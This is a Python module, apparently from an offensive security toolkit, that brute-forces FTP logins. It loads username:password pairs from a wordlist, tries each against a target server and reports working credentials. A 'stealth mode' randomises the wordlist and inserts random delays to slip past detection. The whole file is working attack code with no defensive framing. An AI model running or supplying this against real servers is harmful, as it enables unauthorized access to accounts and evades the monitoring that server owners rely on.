import ftplib
import time
import socket
import random
from utils.wordlist_manager import wordlist_manager
import os

BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
HITS_FILE = os.path.join(BASE_DIR, "logs", "hits.txt")
SESSION_FILE = os.path.join(BASE_DIR, "logs", "session.json")
LOG_FILE = os.path.join(BASE_DIR, "logs", "xvector_log.txt")
WORDLIST_DIR = os.path.join(BASE_DIR, "wordlists")
def ftp_brute_force(target, port=21, wordlist_file="ftp_default_creds.txt", stealth_mode=False, timeout=5, logger=print):
    logger(f"[*] Starting FTP brute-force on {target}:{port} with wordlist: {wordlist_file}")

    try:
        creds = wordlist_manager.load_random() if stealth_mode else wordlist_manager.load(wordlist_file)

        for cred in creds:
            if ":" in cred:
                username, password = cred.strip().split(":", 1)
            else:
                username = password = cred.strip()

            try:
                with ftplib.FTP() as ftp:
                    ftp.connect(target, port, timeout=timeout)
                    ftp.login(user=username, passwd=password)
                    logger(f"[+] FTP Login Success: {username}:{password}")
                    return {
                        "status": "success",
                        "username": username,
                        "password": password
                    }
            except ftplib.error_perm as e:
                logger(f"[-] Failed: {username}:{password} - {e}")
            except (socket.timeout, ConnectionRefusedError, OSError) as e:
                logger(f"[!] Connection error: {e}")
                break

            if stealth_mode:
                delay = random.uniform(0.5, 2.5)
                logger(f"[~] Stealth delay: {delay:.2f}s")
                time.sleep(delay)

    except Exception as ex:
        logger(f"[!] Error in FTP brute-force module: {ex}")

    return {"status": "failed"}
